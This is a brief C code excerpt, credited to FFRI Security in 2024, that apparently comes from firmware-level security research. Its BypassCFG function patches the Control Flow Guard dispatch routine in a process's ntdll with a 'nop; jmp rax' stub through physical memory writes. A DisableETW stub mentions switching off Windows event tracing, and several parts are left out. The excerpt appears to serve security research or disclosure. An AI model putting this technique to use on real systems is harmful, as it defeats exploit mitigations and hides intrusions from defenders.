/*
 * (c) FFRI Security, Inc., 2024 / Author: FFRI Security, Inc.
 */

EFI_STATUS
BypassCFG(
    PEPROCESS proc
    )
{
  // Reference:
  //  https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/
  
  UINT64 NtdllDllBase = GetLoadedDllBase(proc, L"ntdll");
  UINT64 startAddr = (UINT64)GetExport(NtdllDllBase, "RtlRetrieveNtUserPfn");

  // ... Omitted ...

  UINT64 pLdrpDispatchUserCallTarget = startAddr;
  BYTE jmprax[] = { 0x90, 0x48, 0xFF, 0xE0 }; // nop; jmp rax
  
  PhysicalWrite(
      pLdrpDispatchUserCallTarget,
      jmprax,
      sizeof(jmprax)
      );

  return EFI_SUCCESS;
}



VOID
DisableETW(
    BOOLEAN bRestore
    )
{
  // Omitted (basically same as CFG bypass)
}

